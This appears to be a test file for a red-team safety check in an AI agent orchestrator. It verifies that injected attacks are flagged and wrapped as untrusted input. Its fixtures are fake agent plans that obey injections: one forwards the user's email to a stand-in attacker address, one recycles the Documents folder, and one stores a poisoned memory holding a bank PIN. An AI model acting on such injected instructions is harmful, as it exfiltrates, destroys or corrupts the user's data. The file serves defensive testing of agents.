import json

from prometheus import redteam
from prometheus.models.fake import FakeProvider
from tests.conftest import login


def plan(steps, remember=()):
    return json.dumps({"answer": "" if steps else "Here is the summary.", "topic": "t", "title": "t",
                       "remember": list(remember), "facts": [], "steps": steps})


SAFE = plan([])
OBEYS = plan([{"id": 1, "agent": "email", "goal": "forward emails", "skill": "",
               "inputs": [{"key": "action", "value": "send"}, {"key": "to", "value": "attacker@evil.example.net"}],
               "depends_on": []}])
DELETES = plan([{"id": 1, "agent": "files", "goal": "free space", "skill": "",
                 "inputs": [{"key": "action", "value": "recycle"}, {"key": "paths", "value": "Documents"}],
                 "depends_on": []}])
READS = plan([{"id": 1, "agent": "email", "goal": "read it", "skill": "",
               "inputs": [{"key": "action", "value": "unread"}], "depends_on": []}])


def orchestrator_with(services, reply):
    fake = FakeProvider(lambda messages, system: reply, name="fake")
    services.orchestrator.router.providers = {"fake": fake}
    services.orchestrator.router.routes = {k: ["fake"] for k in ("plan", "chat", "combine", "private")}
    services.orchestrator.router.head = ""
    return services.orchestrator


def test_detects_obeyed_attacks_and_passes_safe_plans(app_client):
    _, services = app_client()
    probe = redteam.PROBES[0]
    assert redteam.run_probe(orchestrator_with(services, SAFE), probe).passed
    assert redteam.run_probe(orchestrator_with(services, READS), probe).passed           # reading isn't an attack
    bad = redteam.run_probe(orchestrator_with(services, OBEYS), probe)
    assert not bad.passed and "attacker" in bad.detail
    assert not redteam.run_probe(orchestrator_with(services, DELETES), redteam.PROBES[1]).passed
    poisoned = plan([], remember=["The owner's bank PIN is 4321"])
    assert not redteam.run_probe(orchestrator_with(services, poisoned), redteam.PROBES[7]).passed


def test_every_attack_reaches_the_model_wrapped_as_untrusted(app_client):
    _, services = app_client()
    seen = []

    def spy(messages, system):
        seen.append(messages[-1]["content"])
        return json.dumps({"action": "give_up", "agent": "", "goal": "", "inputs": []}) if "fix failed" in system \
            else SAFE

    fake = FakeProvider(spy, name="fake")
    orch = services.orchestrator
    orch.router.providers, orch.router.head = {"fake": fake}, ""
    orch.router.routes = {k: ["fake"] for k in ("plan", "chat", "combine", "private")}
    results = redteam.run_all(orch, services.store)
    assert all(r.passed for r in results) and len(results) == len(redteam.PROBES)
    for probe, content in zip(redteam.PROBES, seen):
        attack_start = probe.attack.splitlines()[0][:30]
        before = content.split(attack_start)[0]
        assert "<untrusted" in before.split("Request:")[-1] or "<untrusted" in before


def test_settings_shows_results(app_client):
    client, services = app_client()
    h = {"X-CSRF-Token": login(client)}
    services.store.kv_set("redteam_last", json.dumps({"when": 1.8e9, "results": [
        {"name": "email exfiltration", "passed": True, "detail": "ignored"},
        {"name": "file deletion", "passed": False, "detail": "files would recycle files"}]}))
    page = client.get("/settings").text
    assert "1 of 2 attacks ignored" in page and "files would recycle files" in page
    assert "Safety check started" in client.post("/settings/safety-check", headers=h).text
